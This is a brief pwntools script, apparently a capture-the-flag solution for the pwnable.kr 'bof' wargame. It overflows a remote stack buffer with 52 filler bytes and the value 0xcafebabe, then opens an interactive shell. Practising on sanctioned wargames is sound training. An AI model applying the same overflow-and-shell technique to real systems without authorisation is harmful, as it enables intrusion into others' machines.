#!/usr/bin/env python 

from pwn import * 

io = remote('pwnable.kr', 9000)

payload = ''
payload += 'A' * 52
payload += p32(0xcafebabe)

io.send(payload)
io.interactive()
